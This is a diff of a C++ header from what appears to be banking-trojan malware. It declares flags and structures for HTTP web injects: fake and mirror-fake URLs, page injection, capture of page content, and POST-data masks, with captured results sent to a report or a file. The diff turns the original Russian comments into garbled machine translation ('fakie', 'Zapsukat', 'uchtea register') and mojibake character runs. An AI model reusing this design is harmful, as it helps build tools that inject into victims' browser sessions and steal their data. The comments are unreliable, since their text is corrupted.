@@ -5,43 +5,44 @@
 
 namespace HttpInject
 {
-  //Флаги HEADER.flags.
+  //Р¤Р»Р°РіРё HEADER.flags.
+
   enum
   {
-    FLAG_IS_FAKE                  = 0x0001, //Структура является фейком.
-    FLAG_IS_MIRRORFAKE            = 0x0002, //Структура является заеркалом-фейком.
-    FLAG_IS_INJECT                = 0x0004, //Структура является инжектом.
-    FLAG_IS_CAPTURE               = 0x0008, //Структура является заватом контекста.
+    FLAG_IS_FAKE                  = 0x0001, //The structure is a fakie.
+    FLAG_IS_MIRRORFAKE            = 0x0002, //The structure is zaerkalom-fakie.
+    FLAG_IS_INJECT                = 0x0004, //The structure is injected.
+    FLAG_IS_CAPTURE               = 0x0008, //The structure is zavatom context.
 
-    FLAG_ONCE_PER_DAY             = 0x0010, //Запускать структуру раз в 24-часа.
-    FLAG_REQUEST_POST             = 0x0020, //Запсукать структура на POST-запрос.
-    FLAG_REQUEST_GET              = 0x0040, //Запсукать структура на GET-запрос.
+    FLAG_ONCE_PER_DAY             = 0x0010, //Run structure of every 24-hours.
+    FLAG_REQUEST_POST             = 0x0020, //Zapsukat structure on a POST-request.
+    FLAG_REQUEST_GET              = 0x0040, //Zapsukat structure on the GET-request.
 
-    FLAG_CAPTURE_NOTPARSE         = 0x0100, //Не удалять HTML-тэги из заваченого контента.
-    FLAG_CAPTURE_TOFILE           = 0x0200, //Записывать результат завата контента в файл, а не отчет.
+    FLAG_CAPTURE_NOTPARSE         = 0x0100, //Not to remove HTML-tags from zavachenogo content.
+    FLAG_CAPTURE_TOFILE           = 0x0200, //Write result zavata content to a file instead of the report.
     
-    FLAG_URL_CASE_INSENSITIVE     = 0x1000, //Сравнивать URL без учета регистра (только англ. символы).
-    FLAG_CONTEXT_CASE_INSENSITIVE = 0x2000  //Сравнивать содержимое без учтеа регистра.
+    FLAG_URL_CASE_INSENSITIVE     = 0x1000, //Compare URL insensitive (only English. Characters).
+    FLAG_CONTEXT_CASE_INSENSITIVE = 0x2000  //Compare the contents without uchtea register.
   };
 
 # pragma pack(push, 1)
   typedef struct
   {
-    WORD flags;             //Флаги FLAG_*.
-    WORD size;              //Полный размер стрктуры.
-    WORD urlMask;           //Позиция маски URL.
-    WORD fakeUrl;           //Позиция фейковой URL.
-    WORD postDataBlackMask; //Позиция блек-маски POST-данных.
-    WORD postDataWhiteMask; //Позиция вайт-маски POST-данных.
-    WORD blockOnUrl;        //Позиция URL, при заходе на которую эта структура будет заблокирована.
-    WORD contextMask;       //Позиция маски котекста.
+    WORD flags;             //Flags FLAG_ *.
+    WORD size;              //Full size strktury.
+    WORD urlMask;           //Position mask URL.
+    WORD fakeUrl;           //Position create fake URL.
+    WORD postDataBlackMask; //The position of the black-mask POST-data.
+    WORD postDataWhiteMask; //The position of the White-mask POST-data.
+    WORD blockOnUrl;        //The position of the URL, at call on which this structure will be blocked.
+    WORD contextMask;       //Position mask koteksta.
   }HEADER;
 
-  //Заголовок содержимого для инжекта.
+  //Header content for injection produce.
   typedef struct
   {
-    WORD size;    //Размер данных влючая размер этой структуры.
-    WORD flags;   //Флаги.
+    WORD size;    //Size of the data switches on the size of this structure.
+    WORD flags;   //Flags.
   }INJECTBLOCK;
 # pragma pack(pop)
 
@@ -65,14 +66,13 @@ namespace HttpInject
   */
   bool _isCorrectHeader(const HEADER *header);
 
-  /*
-    Проверка корректности набора INJECTBLOCK.
+  /*В В В В Validating set INJECTBLOCK.
 
-    IN block - набор INJECTBLOCK.
-    IN size  - размер набора.
+В В В В IN block - set INJECTBLOCK.
+В В В В IN size - the size of the set.
 
-    Return    - true - корректно,
-                false - не корректно.
-  */
+В В В В Return - true - well,
+В В В В В В В В В В В В В В В В false - is not correct.
+В В */
   bool _isCorrectBlockList(const INJECTBLOCK *block, DWORD size);
 };
